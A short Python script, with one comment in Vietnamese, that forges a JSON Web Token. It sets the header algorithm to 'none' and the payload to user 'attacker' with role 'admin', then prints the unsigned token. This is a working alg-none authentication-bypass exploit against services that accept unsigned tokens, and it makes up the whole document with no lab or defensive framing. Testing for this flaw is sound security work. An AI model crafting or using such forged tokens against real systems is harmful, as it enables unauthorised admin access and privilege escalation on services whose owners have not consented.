import base64, json

def b64url(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).decode().rstrip("=")

header = {"alg": "none", "typ": "JWT"}
payload = {"user": "attacker", "role": "admin"}  # có thể thêm exp nếu muốn

token = f"{b64url(json.dumps(header,separators=(',',':')).encode())}.{b64url(json.dumps(payload,separators=(',',':')).encode())}."
print(token)
